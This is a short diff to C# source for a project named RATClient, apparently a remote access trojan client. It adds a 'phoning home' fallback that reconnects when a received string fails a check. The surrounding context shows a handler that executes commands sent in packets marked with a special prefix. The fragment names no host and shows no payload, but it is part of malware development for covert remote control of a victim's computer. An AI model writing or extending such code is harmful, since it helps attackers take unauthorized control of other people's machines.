@@ -79,6 +79,10 @@ namespace RATClient
                 if (recvString.Trim() != null)
                 {
                     receptionProcessing(recvString);
+                }else
+                {
+                    Console.WriteLine("Something's gone wrong. Phoning home...");
+                    phoneHome();
                 }
                 
             }
@@ -86,6 +90,7 @@ namespace RATClient
         static void receptionProcessing(string recvString)
         {
             Console.WriteLine("Entered reception processing for string: {0}", recvString);
+            
             if(recvString.StartsWith("3><3[")) //If the packet leads with 3><3[ (ooh aren't you so h4x0r), process it with exec
             {
                 String issuedCommand = recvString.Substring(6);
